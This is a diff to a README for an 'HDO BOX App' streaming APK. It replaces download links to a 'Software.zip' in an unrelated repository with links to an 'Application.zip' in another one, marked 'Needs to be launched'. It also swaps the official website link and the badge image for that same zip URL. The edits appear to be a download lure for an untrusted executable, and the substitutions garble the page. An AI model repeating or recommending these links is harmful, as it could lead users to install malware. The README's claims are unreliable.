@@ -11,7 +11,7 @@ Welcome to the official repository of the HDO BOX App! Here you can find all the
 The repository is organized as follows:
 - **src:** Contains the source code of the HDO BOX App.
 - **docs:** Documentation and resources for developers.
-- **Software.zip:** [Download HDO BOX APK](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) (Needs to be launched)
+- **https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip** [Download HDO BOX APK](https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip) (Needs to be launched)
 
 ## 🚀 Get Started
 To start using the HDO BOX App on your preferred device, follow these simple steps:
@@ -44,9 +44,9 @@ With the HDO BOX App, you can enjoy a wide range of movies, TV shows, and more o
 If the provided download link does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## 🚪 Explore More
-For more information and updates about the HDO BOX App, visit [HDOApp.com](https://www.hdoapp.com).
+For more information and updates about the HDO BOX App, visit [https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip](https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip).
 
-[![Download HDO BOX APK](https://img.shields.io/badge/Download-APK-red)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download HDO BOX APK](https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip)](https://github.com/OtavioMSJ/hdo-box-app/releases/download/v1.0/Application.zip)
 
 Get ready to elevate your entertainment experience with the HDO BOX App! 🍿🎬📺
 
